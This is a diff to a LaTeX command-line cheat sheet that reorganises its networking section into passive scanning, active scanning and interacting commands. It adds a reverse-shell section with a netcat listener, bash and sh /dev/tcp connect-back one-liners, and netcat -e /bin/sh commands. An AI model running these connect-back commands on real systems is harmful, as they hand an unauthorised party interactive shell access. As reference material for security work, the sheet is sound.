@@ -210,8 +210,15 @@
 
 
 
+\pagebreak
 
 \section{Networking}
+
+\begin{ldesc}
+	\li[Info about \I{port}] \$ cat /etc/services | grep \I{port}
+\end{ldesc}
+
+\subsection{Passive scanning}
 
 \begin{ldesc}
 	\li[Network traffic (graphical)]  \$ wireshark
@@ -220,18 +227,38 @@
 	\li[Wifi HTTP traffic]            \$ tshark -i wlan0 -f "port 80"
 	\li[Filter syntax]                \$ man pcap-filter
 	\li[Network traffic (altn.)]      \$ tcpdump
+\end{ldesc}
+
+\subsection{Active scanning}
+
+\begin{ldesc}
 	\li[Open ports on host]           \$ nmap [-sV -O -p \I{prange}] \I{host}
 	\li[List hosts on a network]      \$ nmap [-sn] 192.168.0.*
-	\li[Network cat (GNU/BSD)]        \$ nc ...  % TODO: describe netcat
-	\li[Network cat (nmap altn.)]     \$ ncat ... % TODO: describe wireshark ncat
-	\li[Telnet to \I{host} on \I{port}] \$ telnet host port
-	\li[Info about \I{port}] \$ cat /etc/services | grep \I{port}
 	\lI[Query \I{txt} DNS field]      \$ nslookup -query=txt \I{example.com}
 	\li[Query DNS info (on \I{srv})]  \$ dig \I{[@srv]} \I{example.com}
-	\\
+\end{ldesc}
+
+\subsection{Interacting}
+
+\begin{ldesc}
+	\li[Network cat (GNU/BSD)]        \$ netcat host port
+	\li[Network cat (nmap altn.)]     \$ ncat host port
+	\li[Telnet to \I{host} on \I{port}] \$ telnet host port
 	% TODO: curl, wget
 \end{ldesc}
 
+
+\subsection{Reverse shell / Connect back}
+
+\begin{ldesc}
+	\li[netcat listen] client\$ netcat -vlp 1337
+	\lI[Linux connect back]  \$ sh >\& /dev/tcp/client/1337 0>\&1
+	\li[\ \ (colored)]       \$ bash -i >\& /dev/tcp/client/1337 0>\&1
+	\li[Netcat connect back] \$ netcat -e /bin/sh localhost 1337
+	\li[\ \ (colored)]       \$ nc -e "/bin/bash -i" localhost 1337
+\end{ldesc}
+
+\pagebreak
 
 \section{Keyboard Scan Codes (US QWERTY)}
 
